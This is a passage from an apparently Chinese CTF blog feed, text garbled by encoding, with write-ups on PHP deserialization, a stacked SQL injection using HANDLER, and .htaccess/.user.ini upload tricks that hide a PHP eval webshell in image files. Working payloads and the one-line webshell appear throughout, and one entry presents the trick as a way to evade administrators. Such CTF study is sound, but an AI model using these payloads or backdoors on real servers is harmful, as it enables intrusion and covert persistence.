string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><pre><code>O:11:"FileHandler":3:{S:5:"\00*\00op";i:2;S:11:"\00*\00filename";S:8:"flag.php";S:10:"\00*\00content";S:7:"oavinci";}</code></pre><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"oavinci"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>æˆ–è€…ä½¿ç”¨PHPä¼ªåè®®è¯»å–flag.phpï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> "php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.base64-encode/resource=flag.php";</span>    <span class="token keyword">public</span>  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"oavinci"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><img src="/2021/06/18/wang-ding-bei-2020-areuserialz/image-20210618224356908.png" alt="image-20210618224356908"></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF:2020-Blacklist</title>
      <link href="2021/06/17/gyctf-2020-blacklist/"/>
      <url>2021/06/17/gyctf-2020-blacklist/</url>
      
        <content type="html"><![CDATA[<pre><code>1';show columns from `FlagHere`; %23  </code></pre><p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211216152.png" alt="image-20210617211216152"></p><p>è¿‡æ»¤äº†è¿™äº›ä¸œè¥¿</p><p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211254033.png" alt="image-20210617211254033"></p><p>ç”¨åˆ°handler</p><pre><code>HANDLER tbl_name OPEN [ [AS] alias]HANDLER tbl_name READ index_name { = | &lt;= | &gt;= | &lt; | &gt; } (value1,value2,...)    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name READ { FIRST | NEXT }    [ WHERE where_condition ] [LIMIT ... ]HANDLER tbl_name CLOSE //å…¶ä¸­  HANDLER tbl_name OPEN AS example//å…¶åŽ  HANDLER example READ index_name="example2"</code></pre><p>HANDLER â€¦ OPENè¯­å¥æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶å¯ä»¥ä½¿ç”¨åŽç»­HANDLER â€¦ READè¯­å¥è®¿é—®ï¼Œè¯¥è¡¨å¯¹è±¡æœªè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ä¼šè¯è°ƒç”¨HANDLER â€¦ CLOSEæˆ–ä¼šè¯ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­</p><pre><code>1';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</code></pre><p><img src="/2021/06/17/gyctf-2020-blacklist/image-20210617211413055.png" alt="image-20210617211413055"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GXYCTF:2019-BabyUpload</title>
      <link href="2021/06/16/gxyctf-2019-babyupload/"/>
      <url>2021/06/16/gxyctf-2019-babyupload/</url>
      
        <content type="html"><![CDATA[<p>apache</p><p>ä¸Šä¼ .htaccess</p><pre><code>&lt;FilesMatch "1"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><pre><code>Content-Type: image/jpeg</code></pre><pre><code>/var/www/html/upload/7f7b1f9e52adf7726727d061cd3fa94c/.htaccess succesfully uploaded!</code></pre><p>ä¸Šä¼ 1.jpg</p><pre><code>GIF89a?&lt;script language="php"&gt;eval($_POST[1]);&lt;/script&gt;</code></pre><pre><code>/var/www/html/upload/7f7b1f9e52adf7726727d061cd3fa94c/1.jpg succesfully uploaded!</code></pre><p>èšå‰‘è¿žæŽ¥</p><p>d9db5681-3d2b-4655-b8f3-4bc989481944.node3.buuoj.cn/upload/7f7b1f9e52adf7726727d061cd3fa94c/1.jpg</p><p>è™šæ‹Ÿç»ˆç«¯cat /flag</p><p><img src="/2021/06/16/gxyctf-2019-babyupload/image-20210616215125367.png" alt="image-20210616215125367"></p><pre><code>flag{eda5bdce-0717-49c9-9fdf-e8289d3baed6}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:.htaccessæ–‡ä»¶ä¸Šä¼ åŽé—¨</title>
      <link href="2021/06/16/web.htaccess-wen-jian-shang-chuan-hou-men/"/>
      <url>2021/06/16/web.htaccess-wen-jian-shang-chuan-hou-men/</url>
      
        <content type="html"><![CDATA[<p>htaccessæ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå¯ä»¥å®žçŽ°ç½‘é¡µ302é‡å®šå‘ï¼Œè‡ªå®šä¹‰404é¡µé¢ï¼Œæ”¹å˜æ–‡ä»¶æ‹“å±•åï¼Œå…è®¸/é˜»æ­¢ç‰¹ç‚¹çš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ï¼Œç¦æ­¢ç›®å½•åˆ—è¡¨ï¼Œé…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½ã€‚</p><p>åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢å¯ä»¥é€‰æ‹©ä¸€å®šçš„åŽç¼€åä»¥ä»»æ„æƒ³è¦çš„æ ¼å¼è¿›è¡Œè§£æžï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒè¿›è¡Œéšè—åŽé—¨ã€‚</p><p>æ¯”å¦‚è¯´ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªphpçš„çŽ¯å¢ƒï¼Œç„¶åŽæˆ‘ä»¬æœ€ç»ˆä¹ŸèŽ·å¾—äº†å®ƒçš„webshellï¼Œä½†æ˜¯æˆ‘ä»¬çš„é©¬åŽç¼€è¿‡äºŽæ˜Žæ˜¾ï¼Œåœ¨ç®¡ç†å‘˜å®šæœŸçš„æ£€æŸ¥ä¸­ï¼Œä»–ä»¬ä¼šç€é‡æ³¨æ„è„šæœ¬æ–‡ä»¶çš„æ£€æŸ¥ï¼Œè¿™æ—¶å€™å°±ä¼šè¢«ç®¡ç†å‘˜å‘çŽ°ã€‚æ­¤æ—¶å¦‚æžœæˆ‘ä»¬åˆ©ç”¨äº†.htaccessæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†é©¬çš„åŽç¼€æ”¹æˆå›¾ç‰‡æ ¼å¼æˆ–è€…å…¶ä»–ä¸å®¹æ˜“è¢«å‘è§‰çš„æ ¼å¼ï¼Œç„¶åŽè®©æ­¤æ ¼å¼ä»¥phpçš„æ ¼å¼è¿›è¡Œè§£æžï¼Œè¿™æ—¶å€™å›¾ç‰‡åŽç¼€ï¼ˆæˆ–è€…å…¶å®ƒåŽç¼€ï¼‰å°±ç›¸å½“äºŽä¸€ä¸ªphpè„šæœ¬ï¼Œè¿™æ ·å­å°±å¯ä»¥èº²é¿å¤§éƒ¨åˆ†çš„ç®¡ç†å‘˜çš„æ£€æŸ¥ã€‚</p><p>æˆ‘ä»¬åªéœ€è¦å°†ä»¥ä¸‹ä»£ç å†™å…¥.htaccessæ–‡ä»¶ä¸­å³å¯å½¢æˆè§£æžï¼š</p><pre><code>&lt;FilesMatch "jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>æ­¤æ—¶ï¼Œå³å¯ç”¨èœåˆ€å¯¹å›¾ç‰‡åŽç¼€çš„æ–‡ä»¶è¿›è¡Œè¿žæŽ¥ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:.user.iniæ–‡ä»¶ä¸Šä¼ åŽé—¨</title>
      <link href="2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/"/>
      <url>2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/</url>
      
        <content type="html"><![CDATA[<p>.user.iniæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/apache/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•</p><h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p>é‚£ä¹ˆä»€ä¹ˆæ˜¯.user.iniï¼Ÿ</p><p>è¿™å¾—ä»Žphp.iniè¯´èµ·äº†ã€‚php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…æ‹¬äº†å¾ˆå¤šphpçš„é…ç½®ï¼Œè¿™äº›é…ç½®ä¸­ï¼Œåˆåˆ†ä¸ºå‡ ç§ï¼š<code>PHP_INI_SYSTEM</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€<code>PHP_INI_USER</code></p><p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122024800.png" alt="image-20210616122024800"></p><p>å…¶ä¸­å°±æåˆ°äº†ï¼Œæ¨¡å¼ä¸ºPHP_INI_USERçš„é…ç½®é¡¹ï¼Œå¯ä»¥åœ¨ini_set()å‡½æ•°ä¸­è®¾ç½®ã€æ³¨å†Œè¡¨ä¸­è®¾ç½®ï¼Œå†å°±æ˜¯.user.iniä¸­è®¾ç½®ã€‚ è¿™é‡Œå°±æåˆ°äº†.user.iniï¼Œé‚£ä¹ˆè¿™æ˜¯ä¸ªä»€ä¹ˆé…ç½®æ–‡ä»¶ï¼Ÿé‚£ä¹ˆå®˜æ–¹æ–‡æ¡£åœ¨<a href="http://php.net/manual/zh/configuration.file.per-user.php">è¿™é‡Œ</a>åˆè§£é‡Šäº†ï¼š</p><p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»Žè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ<code>$_SERVER['DOCUMENT_ROOT']</code> æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æžœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p><p>åœ¨ <code>.user.ini</code> é£Žæ ¼çš„ INI æ–‡ä»¶ä¸­åªæœ‰å…·æœ‰ PHP_INI_PERDIR å’Œ PHP_INI_USER æ¨¡å¼çš„ INI è®¾ç½®å¯è¢«è¯†åˆ«ã€‚</p><p>è¿™é‡Œå°±å¾ˆæ¸…æ¥šäº†ï¼Œ<code>.user.ini</code>å®žé™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„PHP_INI_PERDIRä¹Ÿå¯ä»¥åœ¨.user.iniä¸­è®¾ç½®ï¼‰</p><p>å®žé™…ä¸Šï¼Œé™¤äº†<code>PHP_INI_SYSTEM</code>ä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬PHP_INI_ALLï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡.user.iniæ¥è®¾ç½®çš„ã€‚</p><p>è€Œä¸”ï¼Œå’Œ<code>php.ini</code>ä¸åŒçš„æ˜¯ï¼Œ<code>.user.ini</code>æ˜¯ä¸€ä¸ªèƒ½è¢«åŠ¨æ€åŠ è½½çš„iniæ–‡ä»¶ã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä¿®æ”¹äº†<code>.user.ini</code>åŽï¼Œä¸éœ€è¦é‡å¯æœåŠ¡å™¨ä¸­é—´ä»¶ï¼Œåªéœ€è¦ç­‰å¾…<code>user_ini.cache_ttl</code>æ‰€è®¾ç½®çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º300ç§’ï¼‰ï¼Œå³å¯è¢«é‡æ–°åŠ è½½ã€‚</p><p>ç„¶åŽæˆ‘ä»¬çœ‹åˆ°php.iniä¸­çš„é…ç½®é¡¹ï¼Œå¯æƒœæˆ‘æ²®ä¸§åœ°å‘çŽ°ï¼Œåªè¦ç¨å¾®æ•æ„Ÿçš„é…ç½®é¡¹ï¼Œéƒ½æ˜¯<code>PHP_INI_SYSTEM</code>æ¨¡å¼çš„ï¼ˆç”šè‡³æ˜¯php.ini onlyçš„ï¼‰ï¼ŒåŒ…æ‹¬<code>disable_functions</code>ã€<code>extension_dir</code>ã€<code>enable_dl</code>ç­‰ã€‚ ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°å€ŸåŠ©<code>.user.ini</code>æ–‡ä»¶æ¥æž„é€ ä¸€ä¸ªâ€œåŽé—¨â€ã€‚</p><p>Phpé…ç½®é¡¹ä¸­æœ‰ä¸¤ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¡¹ï¼ˆä¸‹å›¾ç¬¬ä¸€ã€å››ä¸ªï¼‰ï¼š</p><p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122046860.png" alt="image-20210616122046860"></p><p><code>auto_append_file</code>ã€<code>auto_prepend_file</code>ï¼Œç‚¹å¼€çœ‹çœ‹ä»€ä¹ˆæ„æ€ï¼š</p><p><img src="/2021/06/16/web.user.ini-wen-jian-shang-chuan-hou-men/image-20210616122108740.png" alt="image-20210616122108740"></p><p>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºŽåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œauto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åŽé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æŽ¥å†™åœ¨.user.iniä¸­ï¼š</p><pre><code>auto_prepend_file=01.gif</code></pre><p>01.gifæ˜¯è¦åŒ…å«çš„æ–‡ä»¶ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©.user.iniè½»æ¾è®©æ‰€æœ‰phpæ–‡ä»¶éƒ½â€œè‡ªåŠ¨â€åŒ…å«æŸä¸ªæ–‡ä»¶ï¼Œè€Œè¿™ä¸ªæ–‡ä»¶å¯ä»¥æ˜¯ä¸€ä¸ªæ­£å¸¸phpæ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€ä¸ªåŒ…å«ä¸€å¥è¯çš„webshellã€‚</p><p>åŽŸæ–‡<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ¼æ´žåˆ©ç”¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF:2019-CheckIn</title>
      <link href="2021/06/15/suctf-2019-checkin/"/>
      <url>2021/06/15/suctf-2019-checkin/</url>
      
        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges#[SUCTF%202019]CheckIn">https://buuoj.cn/challenges#[SUCTF%202019]CheckIn</a></p><h2 id="user-iniæ–‡ä»¶ä¸Šä¼ åŽé—¨"><a href="#user-iniæ–‡ä»¶ä¸Šä¼ åŽé—¨" class="headerlink" title=".user.iniæ–‡ä»¶ä¸Šä¼ åŽé—¨"></a>.user.iniæ–‡ä»¶ä¸Šä¼ åŽé—¨</h2><p>å¯ä»¥çœ‹â€œWeb:.user.iniæ–‡ä»¶ä¸Šä¼ åŽé—¨â€</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="SUCTF:2019-CheckIn"></a>SUCTF:2019-CheckIn</h2><pre><code>&lt;?phpif (exif_imagetype("image.gif") != IMAGETYPE_GIF) {    echo "The picture is not a gif";}?&gt;if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {echo "File is not an image";return; }</code></pre><p><img src="/2021/06/15/suctf-2019-checkin/image-20210616120647894.png" alt="image-20210616120647894"></p><p>è¿‡æ»¤äº†&lt;?</p><p>user.iniæ–‡ä»¶å½¢æˆåŽé—¨åŽŸç†å°±æ˜¯ä¼šåœ¨æ‰§è¡Œæ‰€æœ‰çš„phpæ–‡ä»¶ä¹‹å‰åŒ…å«.user.iniæ‰€æŒ‡å®šçš„æ–‡ä»¶</p><p>æ‰€ä»¥æˆ‘ä»¬æž„é€   iniæ–‡ä»¶å†…å®¹ä¸º  auto_prepend_file=1.jpg</p><pre><code>GIF89aauto_prepend_file=1.jpg</code></pre><p>è¿‡æ»¤äº†&lt;?ï¼Œè¿›è¡Œäº†æ–‡ä»¶å¤´çš„æ£€æµ‹ï¼ŒåŠ ä¸€ä¸ªGIF89a</p><pre><code>GIF89a&lt;script language=php&gt; @eval($_POST[1])&lt;/script&gt;</code></pre><p>Your dir uploads/365c7675ba6b8855fe632bc4420ce021<br>Your files :<br>array(5) { [0]=&gt; string(1) â€œ.â€ [1]=&gt; string(2) â€œ..â€ [2]=&gt; string(9) â€œ.user.iniâ€ [3]=&gt; string(5) â€œ1.jpgâ€ [4]=&gt; string(9) â€œindex.phpâ€ }</p><p>ä¸Šä¼ èšå‰‘è¿žæŽ¥ï¼š</p><pre><code>url/uploads/365c7675ba6b8855fe632bc4420ce021/index.php</code></pre><p>è™šæ‹Ÿç»ˆç«¯æ‰§è¡Œå‘½ä»¤  cat/flag</p><p><img src="/2021/06/15/suctf-2019-checkin/image-20210616121058497.png" alt="image-20210616121058497"></p>]]></content>
      
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web:PHPå¼±ç±»åž‹</title>
      <link href="2021/06/14/web-php-ruo-lei-xing/"/>
      <url>2021/06/14/web-php-ruo-lei-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01ï¼šâ€œ-â€å’Œâ€œ-â€"><a href="#0x01ï¼šâ€œ-â€å’Œâ€œ-â€" class="headerlink" title="0x01ï¼šâ€œ==â€å’Œâ€œ===â€"></a><strong>0x01ï¼šâ€œ==â€å’Œâ€œ===â€</strong></h1><p>phpä¸­æœ‰ä¸¤ç§æ¯”è¾ƒçš„ç¬¦å· == ä¸Ž ===</p><p>=== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»åž‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ</p><p>== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»åž‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ</p><p><strong>å¦‚æžœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ</strong></p><pre><code>&lt;?phpvar_dump("admin"==0);  //truevar_dump("1admin"==1); //truevar_dump("admin1"==1) //falsevar_dump("admin1"==0) //truevar_dump("0e123456"=="0e4456789"); //true ?&gt;  //ä¸Šè¿°ä»£ç å¯è‡ªè¡Œæµ‹è¯•</code></pre><p> â€œ0e123456â€==â€0e456789â€ç›¸äº’æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰</p><pre><code>&lt;?php$test=1 + "10.5"; // $test=11.5(float)$test=1+"-1.3e3"; //$test=-1299(float)$test=1+"bob-1.3e3";//$test=1(int)$test=1+"2admin";//$test=3(int)$test=1+"admin2";//$test=1(int)?&gt;</code></pre><h3 id="ä½¿ç”¨-PHP-å‡½æ•°å¯¹å˜é‡-x-è¿›è¡Œæ¯”è¾ƒ"><a href="#ä½¿ç”¨-PHP-å‡½æ•°å¯¹å˜é‡-x-è¿›è¡Œæ¯”è¾ƒ" class="headerlink" title="ä½¿ç”¨ PHP å‡½æ•°å¯¹å˜é‡ $x è¿›è¡Œæ¯”è¾ƒ"></a><strong>ä½¿ç”¨ PHP å‡½æ•°å¯¹å˜é‡ $x è¿›è¡Œæ¯”è¾ƒ</strong></h3><table><thead><tr><th>è¡¨è¾¾å¼</th><th><a href="https://www.php.net/manual/zh/function.gettype.php">gettype()</a></th><th><a href="https://www.php.net/manual/zh/function.empty.php">empty()</a></th><th><a href="https://www.php.net/manual/zh/function.is-null.php">is_null()</a></th><th><a href="https://www.php.net/manual/zh/function.isset.php">isset()</a></th><th>boolean : <code>if($x)</code></th></tr></thead><tbody><tr><td><code>$x = "";</code></td><td>string</td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>$x = null;</code></td><td>NULL</td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>var $x;</code></td><td>NULL</td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td>$x is undefined</td><td>NULL</td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>$x = array();</code></td><td>array</td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>$x = array('a', 'b');</code></td><td>array</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = false;</code></td><td>boolean</td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>$x = true;</code></td><td>boolean</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = 1;</code></td><td>integer</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = 42;</code></td><td>integer</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = 0;</code></td><td>integer</td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>$x = -1;</code></td><td>integer</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = "1";</code></td><td>string</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = "0";</code></td><td>string</td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>$x = "-1";</code></td><td>string</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = "php";</code></td><td>string</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = "true";</code></td><td>string</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>$x = "false";</code></td><td>string</td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td></tr></tbody></table><h3 id="æ¾æ•£æ¯”è¾ƒ"><a href="#æ¾æ•£æ¯”è¾ƒ" class="headerlink" title="æ¾æ•£æ¯”è¾ƒ =="></a><strong>æ¾æ•£æ¯”è¾ƒ <code>==</code></strong></h3><table><thead><tr><th></th><th><strong><code>true</code></strong></th><th><strong><code>false</code></strong></th><th><code>1</code></th><th><code>0</code></th><th><code>-1</code></th><th><code>"1"</code></th><th><code>"0"</code></th><th><code>"-1"</code></th><th><strong><code>null</code></strong></th><th><code>array()</code></th><th><code>"php"</code></th><th><code>""</code></th></tr></thead><tbody><tr><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td></tr><tr><td><code>1</code></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>false</code></strong></td></tr><tr><td><code>0</code></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>false</code></strong></td><td><strong><code>true</code></strong></td><td><strong><code>f